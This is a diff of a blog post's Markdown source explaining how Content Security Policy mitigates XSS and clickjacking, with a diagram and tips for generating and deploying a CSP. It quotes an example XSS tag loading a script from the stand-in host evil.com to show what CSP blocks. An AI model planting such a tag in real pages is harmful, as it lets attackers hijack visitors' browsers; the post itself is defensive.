@@ -16,6 +16,7 @@ canonicalURL: "https://deoxy.net/posts/csp"
 disableHLJS: false # to disable highlightjs
 disableShare: true
 disableHLJS: true
+enableMermaid: true
 hideSummary: false
 searchHidden: false
 ShowReadingTime: true
@@ -33,19 +34,33 @@ editPost:
     appendFilePath: true # to append file path to Edit link
 ---
 
-
 # What's a CSP? 
-TLDR: Use [my Playwright script](https://github.com/deoxykev/quickcsp) to generate comprehensive CSP's quickly.
+One of the mitigating defenses for [XSS attacks](https://portswigger.net/web-security/cross-site-scripting) and [Clickjacking attacks](https://portswigger.net/web-security/clickjacking) is a good Content Security Policy (CSP). While not a pancea, it can effectively limit the severity of any exploits by constraining the XSS payload size to the injection window, which is typically limited to a few characters. Instead of externally loading a payload like:
+```js
+<script src="https://evil.com/payload.js"/>
+```
+the entire payload must be encoded in the script evaluation window, effectively preventing nasty frameworks like [BeEF](https://beefproject.com/) from being loaded.
 
-One of the mitigating defenses for [XSS attacks](https://portswigger.net/web-security/cross-site-scripting) and [Clickjacking attacks](https://portswigger.net/web-security/clickjacking) is a good Content Security Policy (CSP). While not a pancea, it can effectively limit the severity of any exploits by constraining the XSS payload size to the injection window, which is typically limited to a few characters. Instead of externally loading a payload like `<script src="https://evil.com/payload.js/>`, the entire payload must be encoded in the script evaluation window, effectively preventing nasty frameworks like [BeEF](https://beefproject.com/) from being loaded.
 
-![CSP Explaination](./csp_intro.png)
+{{< mermaid >}}
+sequenceDiagram
+    Browser->>+Server: REQUEST https://example.com/assets/js/lib.js 
+    Server-->>+Browser: 200 OK
+    Browser->>+Server: REQUEST https://example.com/static/img/kitty.jpg
+    Server-->>+Browser: 200 OK
+    Note over Server,Browser: Content-Security-Policy:<br>default-src https://example.com 
+    Browser->>+Server: REQUEST https://evil.org/xss.js
+    Server-->>-Browser: 400 Not Allowed (blocked:csp)
+{{< /mermaid >}}
+
 
 CSP's work by essentially "whitelisting" externally loaded content. If `evil.com` is not whitelisted for loading scripts, scripts from `evil.com` cannot be loaded into the site. Sounds great, right? Unfortunately, the reality is that CSPs are only [enforced on 7% of the Alexa Top 1M sites](https://www.rapid7.com/blog/post/2020/11/02/overview-of-content-security-policies-csp-on-the-web/). 
 
 Why is this? If you've ever tried implementing a CSP on a non-trivial site, you'll know the number one difficulty is breaking the site by preventing legitimate content from being loaded-- oftentime on pages you never expected to have content on. It's no wonder top site owners are slow to implement CSPs.
 
 Given an existing sites with tons of legacy content, how does one go about finding the specific external sources for each [CSP directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)? One answer could be opening up devtools and browsing a few pages of the site, then writing it by hand. This might be fine for a single tiny site. But what if you have an entire company's worth of large sites to handle?
+
+> TLDR: Use [my Playwright script](https://github.com/deoxykev/quickcsp) to generate comprehensive CSP's quickly.
 
 # Content Security Policy Generator (Chrome Extension)
 Luckily for us, there is a chrome extension called [Content Security Policy (CSP) Generator](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc?hl=en) which will help us generate a CSP on all visited links. 
@@ -175,6 +190,16 @@ Don't forget to remove any inline scripts from your site.
 
 ## Deploying the CSP
 
-Voila! you are done. Now go deploy your CSP by adding the `Content-Security-Policy: <your_generated_csp>` header to your site, if you have control over the server. If you have control over the content, but not the server, you can add this html tag `<meta http-equiv=”Content-Security-Policy” content=”<your_generated_csp>” />`.
+Voila! you are done. Now go deploy your CSP by adding the 
+```json
+Content-Security-Policy: "your_generated_csp"
+```
+
+header to your site, if you have control over the server.
+
+If you have control over the content, but not the server, you can add this html tag:
+```html
+<meta http-equiv=”Content-Security-Policy” content=”<your_generated_csp>”/>
+```
 
 Hopefully this saves you some time. [Source code here](https://github.com/deoxykev/quickcsp) if you'd like to use it.
